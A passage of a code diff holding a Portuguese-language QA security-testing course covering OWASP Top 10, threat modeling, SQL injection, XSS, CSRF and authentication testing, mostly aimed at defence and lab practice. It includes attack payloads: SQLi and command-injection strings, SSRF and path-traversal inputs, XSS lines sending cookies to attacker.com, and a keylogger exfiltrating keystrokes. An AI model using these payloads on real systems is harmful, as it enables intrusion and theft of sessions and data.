LDAPi</li><li><strong>A04: Insecure Design</strong> — faltam controles de segurança no design</li><li><strong>A05: Security Misconfiguration</strong> — defaults, debug on, headers missing, cloud config</li><li><strong>A06: Vulnerable Components</strong> — libs com CVE conhecidos</li><li><strong>A07: Authentication Failures</strong> — brute force, weak passwords, session mgmt</li><li><strong>A08: Software/Data Integrity Failures</strong> — CI/CD tampering, unsigned artifacts</li><li><strong>A09: Logging/Monitoring Failures</strong> — logs insuficientes, alertas ausentes</li><li><strong>A10: SSRF</strong> — server-side request forgery</li></ol><h3>Quando QA deve pensar em segurança</h3><ul><li>Testando login → brute force, credential stuffing, password policy</li><li>Testando API → auth bypass, IDOR, injection, rate limiting</li><li>Testando upload → file type bypass, path traversal, RCE</li><li>Testando pagamentos → tampering, replay, race condition</li><li>Testando admin → privilege escalation, data exposure</li></ul><h3>Exercício prático</h3><ol><li>Pegue um fluxo que você testa funcionalmente (ex: reset password)</li><li>Liste 5 cenários de segurança para o mesmo fluxo</li><li>Execute 2-3 manualmente (Burp/ZAP)</li><li>Documente achados como bug de segurança (não funcional)</li></ol>, resources: [{ label: "OWASP Top 10", url: "https://owasp.org/www-project-top-ten/" }] },
-        { id: "sec1-l2", title: "OWASP Top 10 — visão geral", duration: "45 min", content: "<p>Top 10 vulnerabilidades web 2021. A01 Broken Access Control, A02 Crypto Failures, A03 Injection, A04 Insecure Design, A05 Misconfig, A06 Vuln Components, A07 Auth Failures, A08 Integrity Failures, A09 Logging Failures, A10 SSRF.</p><h3>OWASP Top 10 2021 — detalhes e como testar</h3><table style="width:100%;border-collapse:collapse;margin:1rem 0"><tr style="background:rgba(0,229,255,0.1)"><th style="padding:0.5rem;border:1px solid var(--border)">ID</th><th style="padding:0.5rem;border:1px solid var(--border)">Nome</th><th style="padding:0.5rem;border:1px solid var(--border)">Descrição</th><th style="padding:0.5rem;border:1px solid var(--border)">Como testar (QA)</th></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>A01</strong></td><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Broken Access Control</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Usuário acessa recursos fora de sua permissão (IDOR, path traversal, missing auth checks)</td><td style="padding:0.5rem;border:1px solid var(--border)">Teste IDOR: mude ID na URL/API. Teste path traversal: ../../etc/passwd. Teste auth bypass: acesse /admin sem login.</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>A02</strong></td><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Cryptographic Failures</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Dados sensíveis transmitidos/armazenados sem criptografia adequada (HTTP, hashes fracos, chaves hardcoded)</td><td style="padding:0.5rem;border:1px solid var(--border)">Verifique HTTPS em todo lugar. Teste senhas: MD5/SHA1? Chaves em código? Dados PII em logs? Certificados expirados?</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>A03</strong></td><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Injection</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Dados não confiáveis enviados a interpretador (SQL, NoSQL, OS command, LDAP, XPATH)</td><td style="padding:0.5rem;border:1px solid var(--border)">SQLi: ' OR '1'='1. NoSQLi: {"$ne": null}. Command: ; cat /etc/passwd. LDAP: *)(uid=*). XPATH: ' or '1'='1.</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>A04</strong></td><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Insecure Design</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Ausência de controles de segurança no design (threat modeling faltando, business logic flaws)</td><td style="padding:0.5rem;border:1px solid var(--border)">Fluxo permite bypass de regras? Ex: compra sem pagamento, reset senha sem token, transfer entre contas sem validação.</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>A05</strong></td><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Security Misconfiguration</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Configurações inseguras (debug on, defaults, headers missing, cloud storage public, verbose errors)</td><td style="padding:0.5rem;border:1px solid var(--border)">Headers: CSP, HSTS, X-Frame-Options. Debug endpoints: /actuator, /swagger. Cloud: S3 public, security groups 0.0.0.0/0.</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>A06</strong></td><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Vulnerable Components</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Uso de libs/frameworks com vulnerabilidades conhecidas (CVEs não patchados)</td><td style="padding:0.5rem;border:1px solid var(--border)">npm audit, Snyk, Dependabot. Teste: force lib com CVE conhecido. Container: trivy scan.</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>A07</strong></td><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Authentication Failures</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Falhas em autenticação/sessão (brute force, weak passwords, session fixation, JWT issues)</td><td style="padding:0.5rem;border:1px solid var(--border)">Brute force: 100 tentativas. Session: fixation, hijacking, timeout. JWT: none alg, weak secret, exp bypass.</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>A08</strong></td><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Software/Data Integrity Failures</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Integridade de software/dados comprometida (CI/CD tampering, unsigned artifacts, auto-update inseguro)</td><td style="padding:0.5rem;border:1px solid var(--border)">Pipeline: assinatura de artifacts, SBOM, supply chain. Auto-update: verificação de assinatura. Deserialization insegura.</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>A09</strong></td><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Logging/Monitoring Failures</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Logs insuficientes para detectar ataques (sem logs de auth, erro genérico, alertas ausentes)</td><td style="padding:0.5rem;border:1px solid var(--border)">Tente ataque → verifique logs. Log tem: user, IP, ação, resultado? Alertas: 5 falhas login = alerta?</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>A10</strong></td><td style="padding:0.5rem;border:1px solid var(--border)"><strong>SSRF</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Server faz requisição para recurso não intencional (metadata cloud, internal services, localhost)</td><td style="padding:0.5rem;border:1px solid var(--border)">Teste: URL=http://169.254.169.254 (AWS metadata), http://localhost:8080/admin, file:///etc/passwd. Valide allowlist.</td></tr></table><h3>Metodologia de teste OWASP</h3><ol><li><strong>Mapeamento:</strong> spider/crawl da app (ZAP, Burp) → identifica endpoints</li><li><strong>Priorização:</strong> foque em A01, A03, A07 (mais comuns/impacto)</li><li><strong>Teste manual:</strong> Burp Repeater/Intruder para injection, IDOR, auth</li><li><strong>Teste automatizado:</strong> ZAP baseline, nuclei templates, SAST</li><li><strong>Documentação:</strong> CWE, CVSS, steps to reproduce, evidence, remediation</li></ol><h3>Exercício prático</h3><ol><li>Rode ZAP baseline scan em <a href="https://juice-shop.herokuapp.com" target="_blank">Juice Shop</a></li><li>Identifique 1 achado de cada: A01, A03, A05, A07</li><li>Reproduza manualmente no Burp/ZAP</li><li>Documente como bug de segurança com CVSS score</li></ol>, resources: [{ label: "OWASP Top 10 2021", url: "https://owasp.org/Top10/" }] },
-        { id: "sec1-l3", title: "Threat modeling básico", duration: "40 min", content: "<p>Threat modeling: STRIDE, PASTA, attack trees. Identifica ameaças no design, antes do código. QA participa validando mitigações.</p><h3>STRIDE — modelo de ameaças Microsoft</h3><table style="width:100%;border-collapse:collapse;margin:1rem 0"><tr style="background:rgba(0,229,255,0.1)"><th style="padding:0.5rem;border:1px solid var(--border)">Letra</th><th style="padding:0.5rem;border:1px solid var(--border)">Ameaça</th><th style="padding:0.5rem;border:1px solid var(--border)">Propriedade CIA</th><th style="padding:0.5rem;border:1px solid var(--border)">Exemplo</th><th style="padding:0.5rem;border:1px solid var(--border)">Mitigação</th></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>S</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Spoofing (falsificação)</td><td style="padding:0.5rem;border:1px solid var(--border)">Autenticação</td><td style="padding:0.5rem;border:1px solid var(--border)">Attacker se passa por user/admin</td><td style="padding:0.5rem;border:1px solid var(--border)">MFA, certificados, assinaturas digitais</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>T</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Tampering (adulteração)</td><td style="padding:0.5rem;border:1px solid var(--border)">Integridade</td><td style="padding:0.5rem;border:1px solid var(--border)">Modifica parâmetros, dados em trânsito</td><td style="padding:0.5rem;border:1px solid var(--border)">Hashes, assinaturas, HTTPS, input validation</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>R</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Repudiation (repúdio)</td><td style="padding:0.5rem:border:1px solid var(--border)">Não-repúdio</td><td style="padding:0.5rem;border:1px solid var(--border)">Usuário nega ação realizada</td><td style="padding:0.5rem;border:1px solid var(--border)">Audit logs imutáveis, non-repudiation</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>I</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Information Disclosure</td><td style="padding:0.5rem;border:1px solid var(--border)">Confidencialidade</td><td style="padding:0.5rem:border:1px solid var(--border)">Vaza dados sensíveis (logs, erros, API)</td><td style="padding:0.5rem;border:1px solid var(--border)">Criptografia, minimização, mascaramento</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>D</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Denial of Service</td><td style="padding:0.5rem:border:1px solid var(--border)">Disponibilidade</td><td style="padding:0.5rem:border:1px solid var(--border)">Exaure recursos, crash, lock</td><td style="padding:0.5rem;border:1px solid var(--border)">Rate limiting, circuit breaker, auto-scaling</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>E</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Elevation of Privilege</td><td style="padding:0.5rem;border:1px solid var(--border)">Autorização</td><td style="padding:0.5rem:border:1px solid var(--border)">User vira admin, container escape</td><td style="padding:0.5rem;border:1px solid var(--border)">Least privilege, RBAC, container hardening</td></tr></table><h3>PASTA — processo de 7 etapas</h3><ol><li><strong>Define Objectives:</strong> negócio, compliance, técnico</li><li><strong>Define Technical Scope:</strong> arquitetura, data flows, trust boundaries</li><li><strong>Application Decomposition:</strong> DFDs, use cases, entry points</li><li><strong>Threat Analysis:</strong> STRIDE per component, attack libraries (CAPEC)</li><li><strong>Vulnerability Analysis:</strong> map threats → existing controls → gaps</li><li><strong>Attack Modeling:</strong> attack trees, kill chains, risk scoring</li><li><strong>Risk Management:</strong> prioritize, mitigate, accept, transfer, monitor</li></ol><h3>Attack Trees — visualização de cenários</h3><pre><code># Exemplo: "Comprometer conta de admin"
-Comprometer conta admin
-├── Credential Theft
-│   ├── Phishing (email falso login)
-│   ├── Keylogger (malware)
-│   └── Credential Stuffing (reuse de breach)
-├── Session Hijacking
-│   ├── XSS rouba session cookie
-│   ├── MITM (rede aberta)
-│   └── Session Fixation
-├── Privilege Escalation
-│   ├── IDOR em /admin/users
-│   ├── Parameter tampering role=admin
-│   └── JWT algorithm confusion (none)
-└── Supply Chain
-    ├── Dependency confusion (npm)
-    ├── CI/CD tampering
-    └── Container image injection</code></pre><h3>Como QA participa do Threat Modeling</h3><ul><li><strong>Validação de mitigações:</strong> cada mitigação = caso de teste de segurança</li><li><strong>Teste de attack trees:</strong> percorra branches, tente explorar</li><li><strong>Data flow validation:</strong> dados sensíveis fluem onde? Criptografados?</li><li><strong>Trust boundary testing:</strong> cruze boundaries (internet → DMZ → internal)</li></ul><h3>Ferramentas</h3><ul><li><strong>Microsoft Threat Modeling Tool:</strong> gratuito, DFD + STRIDE automático</li><li><strong>OWASP Threat Dragon:</strong> open source, web-based, colaborativo</li><li><strong>IriusRisk:</strong> comercial, integração CI/CD, compliance</li><li><strong>Draw.io + template STRIDE:</strong> leve, versionável no Git</li></ul><h3>Exercício prático</h3><ol><li>Escolha um fluxo crítico (ex: checkout pagamento)</li><li>Desenhe DFD simples (Draw.io)</li><li>Aplique STRIDE por componente</li><li>Gere attack tree para "Fraude no pagamento"</li><li>Converta 3 branches em casos de teste de segurança</li></ol>, resources: [] }
-      ]},
-      { id: "sec2", title: "Injection e XSS", lessons: [
-        { id: "sec2-l1", title: "SQL Injection — teoria e testes", duration: "50 min", content: "<p>SQL Injection — injeção de SQL via input não sanitizado. Union-based, error-based, blind, time-based. Prevenção: prepared statements, ORM, WAF.</p><h3>Tipos de SQL Injection</h3><table style="width:100%;border-collapse:collapse;margin:1rem 0"><tr style="background:rgba(0,229,255,0.1)"><th style="padding:0.5rem;border:1px solid var(--border)">Tipo</th><th style="padding:0.5rem;border:1px solid var(--border)">Como funciona</th><th style="padding:0.5rem;border:1px solid var(--border)">Payload exemplo</th><th style="padding:0.5rem;border:1px solid var(--border)">Detecção</th></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Union-based</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">UNION SELECT para extrair dados de outras tabelas</td><td style="padding:0.5rem;border:1px solid var(--border)">' UNION SELECT null,username,password FROM users--</td><td style="padding:0.5rem;border:1px solid var(--border)">Dados extras no response</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Error-based</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Força erro do DB para vazar dados na mensagem de erro</td><td style="padding:0.5rem;border:1px solid var(--border)">' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--</td><td style="padding:0.5rem;border:1px solid var(--border)">Erro SQL no response</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Blind (Boolean)</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">True/False baseado em mudança no response (sem dados diretos)</td><td style="padding:0.5rem;border:1px solid var(--border)">' AND (SELECT SUBSTRING(version(),1,1))='5'--</td><td style="padding:0.5rem;border:1px solid var(--border)">Mudança sutil no conteúdo</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Time-based</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">True/False baseado em delay de resposta</td><td style="padding:0.5rem;border:1px solid var(--border)">' AND IF((SELECT SUBSTRING(version(),1,1))='5',SLEEP(5),0)--</td><td style="padding:0.5rem:border:1px solid var(--border)">Delay na resposta (5s)</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Out-of-band</strong></td><td style="padding:0.5rem:border:1px solid var(--border)">Exfiltração via DNS/HTTP request do DB server</td><td style="padding:0.5rem:border:1px solid var(--border)">' ; DECLARE @q VARCHAR(99); SET @q='\\'+(SELECT version())+'.attacker.com\foo'; EXEC master..xp_dirtree @q--</td><td style="padding:0.5rem:border:1px solid var(--border)">DNS/HTTP request no server do attacker</td></tr></table><h3>Prevenção — Prepared Statements (Parameterized Queries)</h3><pre><code>// ❌ VULNERÁVEL — concatenação de string
-String query = "SELECT * FROM users WHERE email = '" + email + "'";
-Statement stmt = conn.createStatement();
-ResultSet rs = stmt.executeQuery(query);
-
-// ✅ SEGURO — Prepared Statement
-String query = "SELECT * FROM users WHERE email = ?";
-PreparedStatement pstmt = conn.prepareStatement(query);
-pstmt.setString(1, email);
-ResultSet rs = pstmt.executeQuery();
-
-// ✅ ORM (Hibernate, Sequelize, Prisma, SQLAlchemy)
-const user = await User.findOne({ where: { email } }); // parameterized automaticamente</code></pre><h3>Defesa em profundidade</h3><ol><li><strong>Input validation:</strong> allowlist (não blocklist), regex estrito</li><li><strong>Least privilege:</strong> DB user só com SELECT/INSERT necessários, sem DROP</li><li><strong>WAF/IDS:</strong> ModSecurity, Cloudflare WAF — bloqueia payloads conhecidos</li><li><strong>Error handling:</strong> não vaze stack traces / SQL errors para o user</li><li><strong>Monitoring:</strong> alerta em queries com sintaxe suspeita, many failed logins</li></ol><h3>Ferramentas de teste</h3><ul><li><strong>sqlmap:</strong> automático, detecta e explora todos os tipos</li><li><strong>Burp Scanner:</strong> active scan com SQLi payloads</li><li><strong>ZAP:</strong> active scan + SQLi plugin</li><li><strong>nuclei templates:</strong> nuclei -t cves/ -t sql-injection/</li></ul><h3>Exercício prático</h3><ol><li>Configure DVWA (Damn Vulnerable Web App) local: <code>docker run -d -p 80:80 vulnerables/web-dvwa</code></li><li>Vá em SQL Injection → teste manual: <code>' OR '1'='1</code></li><li>Use sqlmap: <code>sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=..." --dump</code></li><li>Documente: tipo, payload, dados extraídos, prepared statement fix</li></ol>, resources: [{ label: "DVWA", url: "https://github.com/digininja/DVWA" }] },
-        { id: "sec2-l2", title: "Cross-Site Scripting (XSS)", duration: "45 min", content: "<p>XSS — Cross-Site Scripting. Injeção de JS no browser da vítima. Reflected, Stored, DOM-based. Prevenção: output encoding, CSP, input validation.</p><h3>Tipos de XSS</h3><table style="width:100%;border-collapse:collapse;margin:1rem 0"><tr style="background:rgba(0,229,255,0.1)"><th style="padding:0.5rem;border:1px solid var(--border)">Tipo</th><th style="padding:0.5rem;border:1px solid var(--border)">Origem do payload</th><th style="padding:0.5rem;border:1px solid var(--border)">Exemplo</th><th style="padding:0.5rem;border:1px solid var(--border)">Impacto</th></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Reflected</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">URL / request parameter → response imediato</td><td style="padding:0.5rem;border:1px solid var(--border)"><code>?search=<script>alert(1)</script></code></td><td style="padding:0.5rem;border:1px solid var(--border)">Victim clica link malicioso</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Stored</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Database → servido para todos usuários</td><td style="padding:0.5rem;border:1px solid var(--border)">Comentário: <code><img src=x onerror=steal()></code></td><td style="padding:0.5rem;border:1px solid var(--border)">Todos que veem a página</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>DOM-based</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Client-side JS processa dados inseguro</td><td style="padding:0.5rem:border:1px solid var(--border)"><code>document.write(location.hash)</code></td><td style="padding:0.5rem;border:1px solid var(--border)">Sem request ao server</td></tr></table><h3>Payloads comuns de teste</h3><pre><code>// Básico
-<script>alert('XSS')</script>
-<img src=x onerror=alert(1)>
-<svg onload=alert(1)>
-
-// Bypass de filtros
-<ScRiPt>alert(1)</ScRiPt>
-<img src=x oneonerror=alert(1)>
-<details open ontoggle=alert(1)>
-
-// Exfiltração real
-<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
-<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>
-
-// Keylogger
-<script>document.onkeypress=function(e){fetch('https://a.com/k?k='+e.key)}</script></code></pre><h3>Prevenção — Output Encoding</h3><table style="width:100%;border-collapse:collapse;margin:1rem 0"><tr style="background:rgba(0,229,255,0.1)"><th style="padding:0.5rem;border:1px solid var(--border)">Contexto</th><th style="padding:0.5rem:border:1px solid var(--border)">Encoding</th><th style="padding:0.5rem:border:1px solid var(--border)">Exemplo</th></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)">HTML body</td><td style="padding:0.5rem;border:1px solid var(--border)">HTML Entity</td><td style="padding:0.5rem;border:1px solid var(--border)"><code>< → &lt; | > → &gt; | " → " | ' → ' | & → &amp;</code></td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)">HTML attribute</td><td style="padding:0.5rem;border:1px solid var(--border)">HTML Entity (tudo)</td><td style="padding:0.5rem;border:1px solid var(--border)"><code>value=""...""</code></td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)">JavaScript</td><td style="padding:0.5rem;border:1px solid var(--border)">JS String Escape</td><td style="padding:0.5rem:border:1px solid var(--border)"><code>\x3c \x3e \x22 \x27 \x5c</code></td></tr><tr><td style="padding:0.5rem:border:1px solid var(--border)">URL</td><td style="padding:0.5rem:border:1px solid var(--border)">URL Encode</td><td style="padding:0.5rem:border:1px solid var(--border)"><code>%3C %3E %22 %27 %26</code></td></tr><tr><td style="padding:0.5rem:border:1px solid var(--border)">CSS</td><td style="padding:0.5rem:border:1px solid var(--border)">CSS Escape</td><td style="padding:0.5rem:border:1px solid var(--border)"><code>\3C \3E \22 \27 \5C</code></td></tr></table><h3>CSP (Content Security Policy) — defesa em profundidade</h3><pre><code># Header CSP restritivo
-Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'
-
-# Nonce-based (para inline scripts necessários)
-<script nonce="abc123">console.log('allowed')</script>
-
-# Report-only para testar antes de enforçar
-Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report</code></pre><h3>Frameworks modernos — auto-escaping</h3><ul><li><strong>React:</strong> <code>{userInput}</code> → auto-escape (use dangerouslySetInnerHTML com cautela)</li><li><strong>Vue:</strong> <code>{{ userInput }}</code> → auto-escape (use v-html com cautela)</li><li><strong>Angular:</strong> <code>{{ userInput }}</code> → auto-escape (bypassSecurityTrustHtml com cautela)</li><li><strong>Template engines:</strong> Nunjucks, Handlebars, EJS — todos escapam por padrão com <code>{{ }}</code></li></ul><h3>Exercício prático</h3><ol><li>Rode XSS challenges no <a href="https://xss-game.appspot.com" target="_blank">Google XSS Game</a> (6 levels)</li><li>Teste Juice Shop: Stored XSS em feedback, Reflected em search, DOM-based em tracking</li><li>Configure CSP em app demo: comece com report-only, analise violations, depois enforça</li><li>Documente: tipo, vetor, payload, encoding fix, CSP rule</li></ol>, resources: [] },
-        { id: "sec2-l3", title: "Automação de checks básicos", duration: "40 min", content: "<p>CSRF — Cross-Site Request Forgery. Attacker faz victim executar ação não intencional em app onde está logado. Proteção: synchronizer token, SameSite, double-submit.</p><h3>Como funciona</h3><ol><li>Victim loga no <code>bank.com</code> → session cookie setado</li><li>Attacker envia link/email com form oculto para <code>bank.com/transfer</code></li><li>Victim clica → browser envia request com cookie de session automaticamente</li><li>Server processa transferência (victim não percebeu)</li></ol><h3>Proteções</h3><table style="width:100%;border-collapse:collapse;margin:1rem 0"><tr style="background:rgba(0,229,255,0.1)"><th style="padding:0.5rem;border:1px solid var(--border)">Método</th><th style="padding:0.5rem;border:1px solid var(--border)">Como funciona</th><th style="padding:0.5rem;border:1px solid var(--border)">Prós</th><th style="padding:0.5rem:border:1px solid var(--border)">Contras</th></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Synchronizer Token</strong></td><td style="padding:0.5rem:border:1px solid var(--border)">Token único por session/form, validado no server</td><td style="padding:0.5rem:border:1px solid var(--border)">Robusto, padrão da indústria</td><td style="padding:0.5rem:border:1px solid var(--border)">Stateful, precisa gerenciar tokens</td></tr><tr><td style="padding:0.5rem:border:1px solid var(--border)"><strong>SameSite Cookie</strong></td><td style="padding:0.5rem:border:1px solid var(--border)"><code>Set-Cookie: session=...; SameSite=Strict</code></td><td style="padding:0.5rem:border:1px solid var(--border)">Simples, stateless, browser nativo</td><td style="padding:0.5rem:border:1px solid var(--border)">Pode quebrar fluxos cross-site legítimos</td></tr><tr><td style="padding:0.5rem:border:1px solid var(--border)"><strong>Double-Submit Cookie</strong></td><td style="padding:0.5rem:border:1px solid var(--border)">Token em cookie + header/custom field, server compara</td><td style="padding:0.5rem:border:1px solid var(--border)">Stateless, fácil implementar</td><td style="padding:0.5rem:border:1px solid var(--border)">Subdomain leakage, precisa HTTPS</td></tr><tr><td style="padding:0.5rem:border:1px solid var(--border)"><strong>Custom Header</strong></td><td style="padding:0.5rem:border:1px solid var(--border)"><code>X-CSRF-Token</code> ou <code>X-Requested-With</code> header obrigatório</td><td style="padding:0.5rem:border:1px solid var(--border)">Simples para SPAs/APIs</td><td style="padding:0.5rem:border:1px solid var(--border)">Não protege forms HTML nativos</td></tr></table><h3>Implementação — Synchronizer Token (Spring/Node/Express)</h3><pre><code>// Server: gera token por session
-app.get('/form', (req, res) => {
-  req.session.csrfToken = crypto.randomBytes(32).toString('hex');
-  res.render('form', { csrfToken: req.session.csrfToken });
-});
-
-// Server: valida no POST
-app.post('/action', (req, res) => {
-  if (req.body._csrf !== req.session.csrfToken) {
-    return res.status(403).send('CSRF token inválido');
-  }
-  // processa ação
-});
-
-// Template (HTML form)
-<form method="POST" action="/action">
-  <input type="hidden" name="_csrf" value="{{csrfToken}}">
-  <!-- campos do form -->
-  <button type="submit">Submit</button>
-</form></code></pre><h3>SameSite Cookie — configuração moderna</h3><pre><code># Strict: cookie NUNCA enviado em cross-site (mais seguro, pode quebrar links externos)
-Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
-
-# Lax: cookie enviado em top-level navigation GET (balanceado)
-Set-Cookie: session=abc123; SameSite=Lax; Secure; HttpOnly
-
-# None: cookie enviado sempre (requer Secure + cross-site explícito)
-Set-Cookie: session=abc123; SameSite=None; Secure; HttpOnly</code></pre><h3>Testando CSRF</h3><ol><li>Crie página HTML externa com form auto-submit para endpoint alvo</li><li>Victim logado no app → abra página externa</li><li>Verifique se ação executou (vulnerável) ou bloqueou (protegido)</li><li>Teste com Burp: remova token CSRF → deve falhar com 403</li></ol><h3>Exercício prático</h3><ol><li>Configure DVWA: <code>docker run -d -p 80:80 vulnerables/web-dvwa</code></li><li>Vá em CSRF → mude senha sem token</li><li>Crie PoC HTML externo que muda senha da victim</li><li>Implemente proteção: adicione token CSRF + SameSite=Lax</li><li>Re-teste PoC → deve falhar</li></ol>, resources: [] }
-      ]},
-      { id: "sec3", title: "Autenticação e Autorização", lessons: [
-        { id: "sec3-l1", title: "Testando login e sessões", duration: "45 min", content: "<p>Auth Testing — brute force, credential stuffing, password policy, session management, JWT, OAuth, MFA. Valide que controles de autenticação funcionam.</p><h3>Cenários de teste essenciais</h3><table style="width:100%;border-collapse:collapse;margin:1rem 0"><tr style="background:rgba(0,229,255,0.1)"><th style="padding:0.5rem;border:1px solid var(--border)">Categoria</th><th style="padding:0.5rem;border:1px solid var(--border)">Testes</th><th style="padding:0.5rem:border:1px solid var(--border)">Ferramentas</th></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Brute Force / Credential Stuffing</strong></td><td style="padding:0.5rem:border:1px solid var(--border)">Rate limiting: 5 tentativas = lockout? CAPTCHA após 3? Account enumeration (user exists vs not)? Password spray (1 senha, 100 users)?</td><td style="padding:0.5rem:border:1px solid var(--border)">Burp Intruder, hydra, custom script</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Password Policy</strong></td><td style="padding:0.5rem:border:1px solid var(--border)">Min 8 chars? Complexidade? Breached password check (HIBP)? History (não reusar últimas 5)? Expiração? Reset token entropy?</td><td style="padding:0.5rem:border:1px solid var(--border)">Manual + zxcvbn lib</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Session Management</strong></td><td style="padding:0.5rem:border:1px solid var(--border)">Session ID: entropy, rotation after login? Idle timeout (15-30min)? Absolute timeout? Concurrent sessions limit? Logout invalida server-side? Secure/HttpOnly/SameSite flags?</td><td style="padding:0.5rem:border:1px solid var(--border)">Burp Repeater, cookie editor</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>JWT Testing</strong></td><td style="padding:0.5rem:border:1px solid var(--border)"><code>alg: none</code> bypass? Weak secret (HS256 com "secret")? <code>exp</code> validation? <code>nbf</code>/<code>iat</code>? Key confusion (RS256 vs HS256)? Token replay? Kid header injection?</td><td style="padding:0.5rem:border:1px solid var(--border)">jwt.io, jwt_tool, custom</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>OAuth / OIDC</strong></td><td style="padding:0.5rem:border:1px solid var(--border)">PKCE enforcement? State parameter validation? Redirect URI exact match? Token exchange validation? Scope validation? Refresh token rotation?</td><td style="padding:0.5rem:border:1px solid var(--border)">Burp, custom flows</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>MFA / 2FA</strong></td><td style="padding:0.5rem:border:1px solid var(--border)">TOTP (Google Auth): replay? Time drift handling? Backup codes: entropy, one-time use? SMS: SIM swap risk? WebAuthn/FIDO2: attestation verification?</td><td style="padding:0.5rem:border:1px solid var(--border)">Authenticator apps, YubiKey</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Account Recovery</strong></td><td style="padding:0.5rem:border:1px solid var(--border)">Reset token: entropy, expiry (15-60min), one-time use? Email/phone verification? Security questions (evitar)? Rate limit on reset requests?</td><td style="padding:0.5rem:border:1px solid var(--border)">Burp Intruder</td></tr></table><h3>Checklist rápido de Auth Testing</h3><ul><li>☐ Login: rate limit, account lockout, generic error messages</li><li>☐ Password: policy, HIBP check, history, reset flow</li><li>☐ Session: secure flags, rotation, timeout, concurrent limit</li><li>☐ JWT: alg validation, secret strength, claims validation</li><li>☐ OAuth: PKCE, state, redirect URI, scope, refresh rotation</li><li>☐ MFA: TOTP/SMS/WebAuthn, backup codes, recovery</li><li>☐ Recovery: token entropy, expiry, one-time, rate limit</li></ul><h3>Exercício prático</h3><ol><li>Teste login em app demo: force 10 falhas → verifique lockout</li><li>Capture JWT → teste <code>alg:none</code>, weak secret, exp bypass</li><li>Teste reset password: token entropy, expiry, one-time use</li><li>Configure MFA TOTP → teste replay, time drift, backup codes</li><li>Documente achados como bugs de segurança com CVSS</li></ol>, resources: [] },
